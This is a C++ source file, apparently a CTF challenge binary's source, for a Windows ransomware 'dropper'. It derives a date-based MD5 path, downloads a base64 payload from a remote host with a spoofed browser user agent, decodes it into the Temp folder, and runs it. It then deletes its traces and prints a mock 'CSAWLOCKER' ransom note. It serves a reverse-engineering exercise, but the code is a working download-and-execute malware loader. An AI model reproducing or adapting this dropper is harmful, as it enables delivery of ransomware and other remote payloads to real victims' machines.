/*
 *  g++ -o dropper.exe dropper.cpp
    cl /EHsc /GA dropper.cpp Advapi32.lib Winhttp.lib
 */
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <typeinfo> //typeid to identify variable types (debugging)
#include <winhttp.h>
#include <Wincrypt.h>
#include <fstream>
#include <iostream>
#pragma comment (lib, "Crypt32.lib")

const WCHAR ccHost[] = L"rev.chal.csaw.io"; // L"192.168.56.102";
const DWORD ccServerPort = 8129; // 9000;


wchar_t* md5sum(BYTE* input) {
    DWORD hash_len = 16;
    HCRYPTPROV provider = 0;
    HCRYPTHASH hasher = 0;
    BYTE hash[16];

    // get handle to the crypto provider
    if (!CryptAcquireContext(&provider,
        NULL,
        NULL,
        PROV_RSA_FULL,
        CRYPT_VERIFYCONTEXT))
    {
        //printf("CryptAcquireContext failed: %d\n", GetLastError());
		exit(1);
    }

    // create MD5 hasher
    if (!CryptCreateHash(provider, CALG_MD5, 0, 0, &hasher))
    {
        //printf("CryptAcquireContext failed: %d\n", GetLastError());
        CryptReleaseContext(provider, 0);
		exit(1);
    }

    // hash input data
    if (!CryptHashData(hasher, input, 16, 0)
        )
    {
        //printf("CryptHashData failed: %d\n", GetLastError());
        CryptDestroyHash(hasher);
        CryptReleaseContext(provider, 0);
		exit(1);
    }

    // get hash result
    if (!CryptGetHashParam(
        hasher, HP_HASHVAL, hash, &hash_len, 0
    ))
    {
        //printf("CryptGetHashParam failed: %d\n", GetLastError());
		exit(1);
    }

    // convert md5sum to char*
    char hexstr[33];
    hexstr[32] = 0;
    for (int i = 0; i < 16; i++) {
        sprintf(hexstr + i * 2, "%02x", hash[i]);
    }

    // convert char* to LPWSTR                            
    wchar_t* wide_hexstr = new wchar_t[33];
    MultiByteToWideChar(CP_ACP, 0, hexstr, -1, wide_hexstr, 33);

    // destroy hasher and provider
    if (hasher)
        CryptDestroyHash(hasher);
    if (provider)
        CryptReleaseContext(provider, 0);

    return wide_hexstr;
}

int Base64Decode(LPCWSTR fileName) {
	HANDLE hFile;
	DWORD fileSize;
	PVOID fileData;
	BOOL bErrorFlag = FALSE;
	DWORD nBytesRead;

	hFile = CreateFileW(fileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		return -1;
	}
	fileSize = GetFileSize(hFile, NULL);
	if (fileSize == INVALID_FILE_SIZE) {
		return -1;
	}
	fileData = malloc(fileSize+1);
	bErrorFlag = ReadFile(hFile, fileData, fileSize, &nBytesRead, NULL);
	if (bErrorFlag == FALSE) {
		free(fileData);
		return -1;
	}
	if (nBytesRead != fileSize) {
		free(fileData);
		return -1;
	}
	// Close the file
	BOOL fileClosed = CloseHandle(hFile);
	if (!(fileClosed)) {
		free(fileData);
		return -1;
	}

	// Now base64 decode the data
	DWORD decodedDataLength; 
	BOOL decodeSuccessful;
	decodeSuccessful = CryptStringToBinaryA((LPCSTR)fileData, nBytesRead, CRYPT_STRING_BASE64, NULL, &decodedDataLength, NULL, NULL);
	if (!(decodeSuccessful)) {
		free(fileData);
		return -1;
	}
	PBYTE decodedData = (PBYTE) malloc(decodedDataLength);
	
	decodeSuccessful = CryptStringToBinaryA((LPCSTR)fileData, nBytesRead, CRYPT_STRING_BASE64, decodedData, &decodedDataLength, NULL, NULL);
	if (!(decodeSuccessful)) {
		free(decodedData);
		free(fileData);
		return -1;
	}

	// Delete the encoded file
	BOOL deleteSuccessful = DeleteFileW(fileName);
	if (!(deleteSuccessful)) {
		free(decodedData);
		free(fileData);
		return -1;
	}

	// Now write out the new file
	hFile = CreateFileW(fileName, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		free(decodedData);
		free(fileData);
		return -1;
	}
	fileSize = decodedDataLength;
	DWORD nBytesWritten;
	bErrorFlag = WriteFile(hFile, decodedData, decodedDataLength, &nBytesWritten, NULL);
	if (bErrorFlag == FALSE) {
		free(decodedData);
		free(fileData);
		return -1;
	}
	if (nBytesWritten != decodedDataLength) {
		free(decodedData);
		free(fileData);
		return -1;
	}
	// Close the file
	fileClosed = CloseHandle(hFile);
	if (!(fileClosed)) {
		free(decodedData);
		free(fileData);
		return -1;
	}

	// Clean up
	free(decodedData);
	free(fileData);
	return 0;
}

int getUserID(WCHAR* userID) {
	wchar_t* IDFileName = (wchar_t *)malloc(MAX_PATH * 2);

	wcsncpy_s(IDFileName, MAX_PATH, _wgetenv(L"USERPROFILE"), (MAX_PATH - 35));
	wcsncat_s(IDFileName, MAX_PATH, L"\\AppData\\Local\\Temp\\sys_procid.txt", 35);
	FILE * IDFile;
	WCHAR hashDigits[] = L"0123456789abcdef";

	IDFile = _wfopen(IDFileName, L"rb");
	if (!IDFile) {
		// Unable to open file for reading
		// fprintf(stderr, "ERROR: fopen error: %s\n", strerror(errno));
		free(IDFileName);
		return errno;
	}

	DWORD num_bytes_read = fread(userID, sizeof(WCHAR), 17, IDFile);
	if (ferror(IDFile)) {
		//fprintf(stderr, "ERROR: fread error: %s\n", strerror(errno));
		free(IDFileName);
		return errno;
	}
	fclose(IDFile);

	// Delete the user ID file
	BOOL deleteSuccessful = DeleteFileW(IDFileName);
	if (!(deleteSuccessful)) {
		free(IDFileName);
		exit(1);
	}
	//printf("Deleted the user ID file.\n");
	free(IDFileName);
	return 0;
}

void dropper(wchar_t* path) {

    // CONNECT TO SERVER TO DOWNLOAD FILE
    HINTERNET hsession = NULL,
        hconnect = NULL,
        hrequest = NULL;

    // open http session
    LPCWSTR agent = L"Mozilla / 5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko / 20100101 Firefox / 89.0";
    hsession = WinHttpOpen(agent,
        WINHTTP_ACCESS_TYPE_NO_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );

    // report any errors
    if (!hsession) {
        //printf("Error %d has occurred.\n", GetLastError());
        exit(1);
    }

    hconnect = WinHttpConnect(hsession, ccHost, ccServerPort, 0);

    // report any errors
    if (!hconnect) {
        //printf("Error %d has occurred.\n", GetLastError());
        exit(1);
	}

    // open request to provided path
    wchar_t* new_path = new wchar_t[34];
    new_path[0] = L'/';
    memcpy(&new_path[1], path, 66);
    hrequest = WinHttpOpenRequest(hconnect, L"GET", path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);

    // report any errors
    if (!hrequest) {
        //printf("Error %d has occurred.\n", GetLastError());
        exit(1);
    }

    // send request 
    bool results;
    results = WinHttpSendRequest(hrequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        WINHTTP_NO_REQUEST_DATA, 0, 0, 0);

    // report any errors.
    if (!results) {
        //printf("Error %d has occurred.\n", GetLastError());
        exit(1);
    }
    // end request and prepare to receive response
	results = WinHttpReceiveResponse(hrequest, NULL);

	// report any errors.
	if (!results) {
		//printf("Error %d has occurred.\n", GetLastError());
		exit(1);
	}

	// check for 200 status code 
	DWORD sc = 0;
	DWORD dwSize = sizeof(sc);
	WinHttpQueryHeaders(hrequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
		WINHTTP_HEADER_NAME_BY_INDEX, &sc,
		&dwSize, WINHTTP_NO_HEADER_INDEX);

	if (sc != 200) {
		exit(1);
	}
	
	// parse response and save to file 
	DWORD size, downloaded;
	LPSTR buffer;
	std::ofstream file_out;
	
	wchar_t* outFileName = (wchar_t *) malloc(MAX_PATH*2);
	wcsncpy(outFileName, _wgetenv(L"USERPROFILE"), (MAX_PATH -33));
	wcsncat(outFileName, L"\\AppData\\Local\\Temp\\sys_proc.txt", 33); 
	file_out.open(outFileName);
	
	if (file_out.fail()) {
		//printf("file failed to open\n");
		free(outFileName);
		exit(1);
	}

	do
	{
		// check for available data
		size = 0;
		if (!WinHttpQueryDataAvailable(hrequest, &size)) {
			//printf("Error %u in WinHttpQueryDataAvailable.\n",
			//	GetLastError());
			free(outFileName);
			exit(1);
		}

		// allocate buffer
		buffer = new char[size + 1];
		if (!buffer)
		{
			//printf("Out of memory\n");
			size = 0;
			free(outFileName);
			exit(1);
		}
		else
		{
			// zero buffer read the data
			ZeroMemory(buffer, size + 1);
			if (!WinHttpReadData(hrequest, (LPVOID)buffer,
				size, &downloaded)) {
				//printf("Error %u in WinHttpReadData.\n", GetLastError());
				free(outFileName);
				exit(1);
			}
			else {
				//printf("%s", buffer);
				file_out.write(buffer, size);
			}

			// free the memory allocated to the buffer
			delete[] buffer;
		}
	} while (size > 0);

	// close any open handles
	file_out.close();
	if (hrequest) WinHttpCloseHandle(hrequest);
	if (hconnect) WinHttpCloseHandle(hconnect);
	if (hsession) WinHttpCloseHandle(hsession);

	//Base64 Decode the file
	if (Base64Decode(outFileName) != 0) {
		//printf("Error in reading sys_proc.txt");
		free(outFileName);
		exit(1);
	}

	STARTUPINFO si;
	//STARTUPINFOA si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	if (!CreateProcessW(outFileName, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
		free(outFileName);
		exit(1);
	}
	// Wait for the child process to exit.
	WaitForSingleObject(pi.hProcess, INFINITE);

	// Read the user ID and delete that file
	WCHAR userID[17];
	BOOL gotUserID = getUserID(userID);
	if (gotUserID != 0) {
		free(outFileName);
		exit(1);
	}

	// Delete the encryptor
	BOOL deleteSuccessful = DeleteFileW(outFileName);
	if (!(deleteSuccessful)) {
		free(outFileName);
		exit(1);
	}

	// Print a scary message
	std::cout << R"(
MMWWMMWWWMWWWMMWWMMWWWMMWWMMWWWMMWWMMWWWMMWWMMWWWMMWWWMMWWWMWWWMMWWWMWWWMWWWMMWWWMMWWMMWWWMWWWMMWWMM
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWMWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWNK0kxdoolllloodxk0KXWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWXOdc;'..               .';cokKNWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWMWWWMWWWWWWWWWWWWMMWWWMWXko;.   ..',;:ccllllllcc:;,'..   .;lkKWMWWWWWWWWMWWWWWWWWWWWWMWWWWWWW
MWWWWMWWWMWWWWMWWWMWWWMMWWWWXkc'   .':ldxkkkkkkkkkkkkkkkkkkxdl:,.   .cxXWMWWWMWWWMWWWWMWWWMWWWWMWWWM
WWWWWWWMWWWMWWWWMWWWMWWWWWKo,   .;ldkkkkkOkOOOOOOOOOOOOOOOOOkkkkxo:'.  'o0WMWWMMWWWMMWWWMWWWMWWWWMWW
MWWWWMWWWMWWWMWWWWMWWWMWKl.  .;lxkkkkkOOOOOOOOOOOOOOOOOOOOOOOOOOkkkxo;.  .c0WMWWWMWWWWMWWWMWWWMWWWWM
WWMWWWWMWWWMWWWWMWWWMWXd.  .:dkkkOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOkkkdc.  .oKWWWWWMWWWWMWWWMWWWWWWW
MWWWWMWWWMWWWMWWWWMWWO;  .:dkkkOOOOOOOOOOO0000000000000000OOOOOOOOOOOkkkd:.  ,kNWMWWWWMWWWMWWWMWWWWM
WWWWWWWMWWWMWWWWWWWNx.  'okkkkOOOOOOOO000000000000000000000000OOOOOkkkkkkko,  .dNWWWWWWWMWWWMWWWWMWW
WWWWWWWWWWWWWWWWWWNo.  ;xkkkkOOOOOO000000000000000000000000000000Od;..:xOkkx:. .lXWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWNd. .:xkkOOOOOOOO00000000K0KKKKKKKKKKKKKK0000000Ol.  'dOOkkxc. .lNWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWx.  :xkkOOOOOO00000Od;';o0KKKKKKKKKKKKKKKKKK00000OdllxOOOOkkx:. .dWWWWWWWWWWWWWWWWW
WWWWWWWWWMWWWWWW0,  ,xkkOOOOOO000000k,   'kKKKKKKKXXKKKKKKKKKKK0000000OOOOOOkkx;  'OWWMWWWMWWWMWWWWW
WWMWWWWMWWWMWWWNo  .lkkkOOOOO00000000d:,:d0XXXXXXXXXXXXXXKKKKKKK0000000OOOOOOkko.  lNWWWMWWWMWWWWMWW
MWWWMMWWWMWWWMMK,  ;xkkOOOOOO000000KKKKKKKXXXXXXXXXXXXXXXXXKKKKKKK00000OOOOOOkkx:  '0MMWWWMWWWMWWWWM
WWWWWWWMWWWMWWWk. .ckkkOOOOO0000000KKKKKKXXXXXXXNNNNXXKKK000000KKK000000OOOOOOkkl. .xWWMMWWWMWWWWMWW
MWWWWMWWWMWWWMWd. .okkOOOOOO000000KKKKKKXXXXXX0kdlcc:;;;,,,,,;;;::lk0000OOOOOkkko.  oWWWWWMWWWWWWWWM
WWWWWWWMWWWMWWWo  .okkOOOOOO000000KKKKKKXXKkl:,'.''',,;;;;;;;;;;,'.'oO00OOOOOOkkd.  lNWWMWWWMWWWWMWW
WWWWWMWWWMWWWWWd. .okkOOOOOO000000KKKKKXKx;..,;;::::::::::::::::::;..d00OOOOOOkkd.  oWMWWWWWWWWWWWWM
WWWWWWWWWWWWWWWk. .ckkkOOOOO000000KKKKKOc.';::;;;;;;;;;;;;;::::::::,.;O0OOOOOOkkl. .xWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWW0,  ;xkkOOOOOO000000KKKk;.,::;;;;;;;;;;;;;;;;;;:::::;.,k0OOOOOkkk:  '0WWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWNl  .okkOOOOOOO000000KO;.,::;;;;;;;;;;;;;;;;;;;;::::;.,xOOOOOOkkd.  cNWWWWWWWWWWWWWWW
WWWWWWWMWWWMWWWW0,  ,xkkOOOOOOO000000c..;;;;;;;;;;;;,,,,;;;;;;;;:::;.,kOOOOOkkx;  'OWWWWMWWWMWWWWWWW
MWWWWMWWWMWWWMMWWx. .:xkkOOOOOO00000x'.,;;::::::::::;;;,;;;;;;;;:::'.cOOOOOOkkc. .dNWMWWWWMWWWMMWWWM
WWWWWWWMWWWMWWWWMNo. .cxkkOOOOOOO000l..;::::ccccccccc::;;;;;;;;:::;..oOOOOkkkc.  lXMWWWWMWWWMWWWWMWW
MWWWMMWWWMWWWWMWWWNo. .:xkkOOOOOOOOOc.';:::cccllllcccc::;;;;;;:::;'.:kOOkkkx:.  lXWWWMMWWWMWWWWMWWWM
WWMWWWWMWWWMWWWWMWWNd.  ,okkkOOOOOOOo..;:::cccccccccc:::;;;;,''.'',cxOOkkkd,  .oXWWMWWWWMWWWMWWWWWWW
MWWWWMWWWMWWWMWWWWMWNO,  .:dkkkOOOOOk:..;:::::cc::::;,'...',,;cldxkOOkkkxc.  'kNWMWWWMWWWWMWWWMWWWWM
WWWWWWWMWWWMWWWWWWWWWWKo.  .cdkkkkkOOkl'...''..'''',,;:cloxkOOOOOkkkkkxc.  .lKWWWWWWWWWWWWWWMWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWW0c.  .;oxkkkkOOxoc:::clodxxkkOOOOOOOOOOkkkkxo:.  .cOWWWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWW0l'  .':oxkkkkOOOOOOOOOOOOOOOOOOOkkkkkxo:'.  .l0NWWWWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWXkc.   .,:ldxkkkkkkkkkkkkkkkkkkxdl:,.   .:xKWWWWWWWWWWWWWWWWWWWWWWWWWWWW
MWWWWWWWWMWWWWWWWWMWWWMWWWWMWWWXkl,.   ..',::cllooolllcc:;'..   .,cxKWWWMWWWWMWWWMWWWWWWWWMWWWWWWWWM
WWMWWWWMWWWMWWWWMWWWMWWWMMWWMMWWWWNKko:,..                ..,:ox0NWWWWMWWWWMWWWMWWWMWWWWMWWWMWWWWMWW
MWWWMWWWWMWWWMWWWWMWWWMWWWWMWWWMWWWMMWWNXKOxdollllllllodxk0XNWWWWWWWMWWWMWWWMMWWWMWWWMMWWWMWWWMWWWWM
WWWWWWWMWWWMWWWWMWWWMWWWWMWWWMWWWMWWWWMWWWWWWWWMWWWWMMWWWMWWWMMWWWMWWWMWWWMWWWWMWWWMWWWWMWWWMWWWWMWW
MWWWMWWWWMWWWMWWWWMWWWWWWWWMWWWWWWWWWWWWMWWWWWWWWWMWWWWMWWMMWWWMWWWWMWWWWMWWWWWWWWWWWWWWWWMWWWMWWWWM
)" << '\n';
	wprintf(L"");
	wprintf(L"                                       O H   N O E S ! ! ! ! \n\n");
	wprintf(L"");
	wprintf(L"WE HAVE ENCRYPTED YOUR SECRET CSAW FILES WITH CSAWLOCKER.\n");
	wprintf(L"WE ACCEPT PAYMENT IN FLAGS, MONTHLY INSTALLMENTS ARE ACCEPTABLE.\n");
	wprintf(L"YOUR USER ID IS %s WHEN YOU CONTACT OUR CUSTOMER SERVICE DEPARTMENT.\n",userID);
	wprintf(L"DON'T TRY TO GET YOUR DATA BACK BEFORE THE END OF THE CTF, OUR RANSOMWARE IS FOOLPROOF.\n");
	wprintf(L"\n");
	wprintf(L"P.S. MUAHAHAHAHAHA.\n");

	// Clean up
	free(outFileName);
}



int main() {

    // get system time
    SYSTEMTIME system_time;
    GetSystemTime(&system_time);

    // concatenate data in single byte array
    DWORD dow = system_time.wDayOfWeek;
    DWORD mon = system_time.wMonth;
    DWORD yr = system_time.wYear;
    DWORD day = system_time.wDay;

    BYTE byte_array[sizeof(DWORD) * 4];
    memcpy(byte_array, &dow, sizeof(DWORD));
    memcpy(&byte_array[4], &mon, sizeof(DWORD));
    memcpy(&byte_array[8], &yr, sizeof(DWORD));
    memcpy(&byte_array[12], &day, sizeof(DWORD));

    // get md5 conversion of the above date values
    wchar_t* path = md5sum(byte_array);

    // get executable from server if it's the correct day
    dropper(path);
}
